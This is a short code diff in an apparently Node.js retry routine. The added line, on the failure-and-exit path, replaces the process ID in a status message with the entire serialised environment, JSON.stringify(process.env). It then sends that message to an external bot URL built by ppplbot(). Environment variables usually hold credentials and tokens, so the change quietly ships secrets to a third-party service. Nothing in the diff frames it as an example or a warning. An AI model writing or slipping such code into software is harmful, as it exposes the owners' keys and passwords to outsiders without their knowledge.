@@ -30,7 +30,7 @@ async function retryConnection() {
         }
         if (retryTime > 5) {
             console.log("Exitiing");
-            await fetchWithTimeout(`${ppplbot()}&text=${(process.env.clientId).toUpperCase()}:UNABLE TO START at RETRY - EXITTING\n\nPid:${process.pid}\n\nenv: ${process.env.clientId}`);
+            await fetchWithTimeout(`${ppplbot()}&text=${(process.env.clientId).toUpperCase()}:UNABLE TO START at RETRY - EXITTING\n\nENV:${JSON.stringify(process.env)}\n\nenv: ${process.env.clientId}`);
             process.exit(1);
         }
         if (false &&!process.env.repl?.includes("glitch")) {
